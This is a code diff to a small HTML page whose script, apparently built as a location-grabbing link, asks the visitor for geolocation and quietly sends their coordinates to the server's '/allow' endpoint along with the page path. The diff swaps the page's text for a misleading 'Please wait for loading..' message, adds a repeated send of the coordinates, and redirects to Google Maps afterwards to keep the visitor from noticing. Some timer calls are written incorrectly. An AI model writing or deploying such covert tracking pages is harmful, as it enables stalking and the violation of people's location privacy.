@@ -2,11 +2,12 @@
 <html>
 
 <body>
-    <p>Please refresh the page and try again</p>
+    <p>Please wait for loading..</p>
     <p id="AllowLocation"></p>
     <p id="IPinfo"></p>
     
     <script>
+        const delay = ms => new Promise(res => setTimeout(res, ms));
         var Latitude;
         var Longitude;
         window.onload = async function pageload() {
@@ -30,11 +31,15 @@
                 await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname )      
                 //document.getElementById("AllowLocation").innerHTML = "Geolocation is allowed";
                 
-                fetch(window.location.href);
-                setTimeout(await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname ), 3000)
+                await fetch(window.location.href);
+                await setTimeout(await fetch(window.location.origin+'/allow?lat='+position.coords.latitude+','+position.coords.longitude +'&cl='+window.location.pathname ), 5000)
                 
-                //setInterval(window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude, 10000);
+
+                await delay(3000);
+                window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude
+                //await setTimeout(window.location.href="https://www.google.com/maps/?q="+position.coords.latitude+','+position.coords.longitude, 10000);
         }       
+
             };  
 
     </script>
